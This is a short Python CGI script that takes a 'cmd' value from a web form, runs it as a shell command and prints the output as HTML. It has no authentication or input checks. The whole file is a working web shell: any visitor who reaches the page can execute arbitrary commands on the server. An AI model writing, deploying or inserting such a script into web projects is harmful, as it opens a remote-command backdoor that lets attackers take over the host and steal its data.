#!/usr/bin/python3
print("Content-type: text/html")
print()

import subprocess
import cgi

form = cgi.FieldStorage()
command= form.getvalue('cmd')
output=subprocess.getoutput(command)
print("<pre>")
print(output)
print("</pre>")